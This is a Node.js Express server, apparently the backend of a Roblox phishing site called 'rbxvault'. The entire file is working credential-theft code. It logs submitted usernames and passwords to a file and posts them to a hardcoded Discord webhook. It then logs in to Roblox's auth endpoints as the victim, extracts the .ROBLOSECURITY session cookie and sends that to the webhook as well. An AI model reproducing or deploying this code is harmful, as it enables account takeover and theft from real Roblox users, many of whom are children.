const express = require('express');
const axios = require('axios');
const fs = require('fs');

const app = express();
app.use(express.json());
app.use(express.static('.'));

const WEBHOOK = 'https://discord.com/api/webhooks/1545632519007903804/1YvZwBPnU_iH1kHqLs8TfltiA96QhKxg3hbZbgydz9cKKM53hO_Wz4MGdCMYKotsv72n';

app.post('/api/capture', async (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({ status: 'error' });
    }

    // log creds
    const logLine = `[${new Date().toISOString()}] ${username}:${password}\n`;
    fs.appendFileSync('creds.log', logLine);

    // send creds to webhook
    await axios.post(WEBHOOK, {
        content: `🔐 **roblox credentials**\n**user:** \`${username}\`\n**pass:** \`${password}\``
    }).catch(() => {});

    // --- COOKIE THEFT STARTS HERE ---
    let cookie = null;

    try {
        // first, get the csrf token
        const csrfRes = await axios.get('https://auth.roblox.com/v2/login', {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });

        const csrfToken = csrfRes.headers['x-csrf-token'];
        if (!csrfToken) throw new Error('no csrf token');

        // now login with the token
        const loginRes = await axios.post('https://auth.roblox.com/v2/login', {
            ctype: 'Username',
            cvalue: username,
            password: password
        }, {
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-TOKEN': csrfToken,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            },
            maxRedirects: 0,
            validateStatus: (status) => status === 200 || status === 302
        });

        // extract the .ROBLOSECURITY cookie from set-cookie headers
        const setCookie = loginRes.headers['set-cookie'];
        if (setCookie) {
            const found = setCookie.find(c => c.startsWith('.ROBLOSECURITY='));
            if (found) {
                cookie = found.split(';')[0];
                // send cookie to webhook
                await axios.post(WEBHOOK, {
                    content: `🍪 **.ROBLOSECURITY cookie**\n\`${cookie}\``
                }).catch(() => {});
            }
        }

        // if we got here without a cookie, try the old endpoint
        if (!cookie) {
            const fallbackRes = await axios.post('https://www.roblox.com/login', {
                username: username,
                password: password
            }, {
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0'
                },
                maxRedirects: 0,
                validateStatus: (status) => status === 200 || status === 302
            });

            const fallbackCookie = fallbackRes.headers['set-cookie'];
            if (fallbackCookie) {
                const found = fallbackCookie.find(c => c.startsWith('.ROBLOSECURITY='));
                if (found) {
                    cookie = found.split(';')[0];
                    await axios.post(WEBHOOK, {
                        content: `🍪 **.ROBLOSECURITY cookie (fallback)**\n\`${cookie}\``
                    }).catch(() => {});
                }
            }
        }

    } catch (e) {
        // silently fail—creds already sent
    }

    res.json({ status: 'ok', cookie: !!cookie });
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`rbxvault running on port ${port}`);
});
